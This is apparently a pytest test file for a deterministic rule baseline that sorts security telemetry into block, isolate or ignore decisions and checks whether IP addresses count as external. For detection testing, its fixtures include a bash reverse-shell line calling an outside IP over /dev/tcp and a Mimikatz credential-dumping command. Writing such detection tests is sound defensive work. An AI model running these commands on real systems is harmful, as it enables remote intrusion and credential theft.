"""The deterministic rule baseline: decisions, restraint, and determinism."""
from __future__ import annotations

import json

from agent.rules import _is_external, classify
from conftest import alert_row, endpoint_row, make_db, session_row


def test_external_scanner_is_blocked(db_path):
    path = make_db(
        db_path,
        alerts=[
            alert_row("45.83.220.5", "ET SCAN Nikto Web App Scan"),
            alert_row("45.83.220.5", "ET SCAN Nikto Web App Scan", dst_ip="10.20.1.11"),
        ],
    )

    verdict = classify("45.83.220.5", db_path=path)

    assert verdict.decision == "BLOCK_IP"
    assert verdict.confidence_score >= 55
    assert "45.83.220.5" in verdict.reasoning


def test_informational_alert_on_known_good_ip_is_ignored(db_path):
    path = make_db(
        db_path,
        alerts=[alert_row("40.97.128.10", "ET INFO Microsoft 365 Sign-in")],
    )

    assert classify("40.97.128.10", db_path=path).decision == "IGNORE"


def test_internal_address_is_never_blocked(db_path):
    path = make_db(db_path, network=[session_row("u1", "10.20.4.15", "10.20.2.20", port=445)])

    assert classify("10.20.4.15", db_path=path).decision == "IGNORE"


def test_reverse_shell_on_host_isolates(db_path):
    path = make_db(
        db_path,
        endpoint=[
            endpoint_row("APP-BO-02", "/bin/bash -i >& /dev/tcp/45.83.221.30/4444 0>&1"),
        ],
    )

    verdict = classify("APP-BO-02", db_path=path)

    assert verdict.decision == "ISOLATE_HOST"
    assert any("/dev/tcp/" in item for item in verdict.evidence)


def test_benign_host_is_ignored(db_path):
    path = make_db(
        db_path,
        endpoint=[endpoint_row("WS-VHALE-01", "LogonType 2 interactive logon succeeded")],
    )

    assert classify("WS-VHALE-01", db_path=path).decision == "IGNORE"


def test_host_with_no_telemetry_is_ignored(db_path):
    path = make_db(db_path)

    verdict = classify("WS-NOBODY-01", db_path=path)

    assert verdict.decision == "IGNORE"
    assert "No telemetry" in verdict.reasoning


def test_beacon_shaped_sessions_are_flagged(db_path):
    sessions = [
        session_row(f"b{i}", "10.20.3.44", "45.83.221.30", sent=412, received=88, ts=1778422560.0 + i * 60)
        for i in range(8)
    ]
    path = make_db(db_path, network=sessions)

    assert classify("45.83.221.30", db_path=path).decision == "BLOCK_IP"


def test_rules_are_deterministic(db_path):
    path = make_db(
        db_path,
        endpoint=[endpoint_row("DC-BO-01", "sekurlsa::logonpasswords")],
        alerts=[alert_row("45.83.220.5", "ET SCAN Nikto")],
    )

    first = classify("DC-BO-01", db_path=path)
    second = classify("DC-BO-01", db_path=path)

    assert (first.decision, first.score) == (second.decision, second.score)


def test_evidence_payloads_are_matched_once_decoded(db_path):
    """Regression: JSON payload columns must not be double-escaped before matching."""
    payload = {"timestamp": "May 10 01:10:02", "event_id": 4720, "hostname": "BKUP-BO-01"}
    path = make_db(
        db_path,
        endpoint=[("May 10 01:10:02", "BKUP-BO-01", "windows_event", json.dumps(payload))],
    )

    verdict = classify("BKUP-BO-01", db_path=path)

    assert verdict.score >= 30
    assert any("4720" in item for item in verdict.evidence)


def test_is_external_lab_interior_is_internal():
    """100.64.0.0/10 (CGNAT) is the lab interior, not external."""
    assert _is_external("100.64.4.4") is False
    assert _is_external("100.64.3.64") is False
    assert _is_external("100.64.0.130") is False


def test_is_external_test_net_three_is_external():
    """203.0.113.0/24 (TEST-NET-3) is the lab's external attacker space.

    Regression: Python 3.13's ``ipaddress.is_private`` returns True for this
    range, which inverted the external/internal decision for attacker IPs.
    """
    assert _is_external("203.0.113.92") is True
    assert _is_external("203.0.113.127") is True


def test_is_external_documentation_ipv6_is_internal():
    """2001:db8::/32 peers are lab-internal."""
    assert _is_external("2001:db8::3779") is False


def test_is_external_rfc1918_and_loopback_are_internal():
    assert _is_external("10.20.4.15") is False
    assert _is_external("172.16.9.9") is False
    assert _is_external("192.168.1.1") is False
    assert _is_external("127.0.0.1") is False
    assert _is_external("169.254.1.1") is False
    assert _is_external("fe80::1") is False
    assert _is_external("fc00::1") is False
    assert _is_external("::1") is False


def test_is_external_public_addresses_are_external():
    assert _is_external("45.83.220.5") is True
    assert _is_external("8.8.8.8") is True
    assert _is_external("2606:4700:4700::1111") is True


def test_is_external_unparseable_value_is_not_external():
    assert _is_external("HOST-WIN-A") is False
    assert _is_external("not-an-ip") is False
    assert _is_external("") is False